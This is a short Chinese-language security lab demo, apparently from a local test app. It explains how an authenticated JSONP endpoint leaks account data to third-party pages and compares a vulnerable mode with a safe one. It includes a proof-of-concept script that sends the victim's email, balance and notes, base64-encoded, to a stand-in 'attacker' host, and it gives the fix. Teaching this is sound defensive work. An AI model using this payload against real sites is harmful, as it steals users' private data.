带身份 JSONP / CSRF Token 防不住的"读"

vuln：/api/jsonp/account?callback=fn 会带着 Cookie 返回敏感字段（email/balance/private_note）
   并用 fn(...) 包装。第三方页面只需一个 <script src> 就能拿到。
safe：检测到 ?callback= 即直接 400 拒绝，强制 application/json。

PoC（直接点击对比响应类型与 body）：
  vuln：/api/jsonp/account?callback=leak&mode=vuln
  safe：/api/jsonp/account?callback=leak&mode=safe

第三方页面 PoC：
  <script>
    function leak(d) { fetch('//attacker/' + btoa(JSON.stringify(d))); }
  </script>
  <script src="http://localhost:5070/api/jsonp/account?callback=leak"></script>

安全性对比

  • CSRF Token 只能阻止 写 操作的伪造请求；JSONP 是 读 通道，CSRF Token 完全不参与。
  • SameSite=Strict / Lax 能缓解一部分，但若服务端响应直接是可执行 JS，攻击者仍可以诱导用户点击带 Cookie 的链接。
  • 真正的修法：所有带身份的接口必须返回 application/json 且禁用 callback。
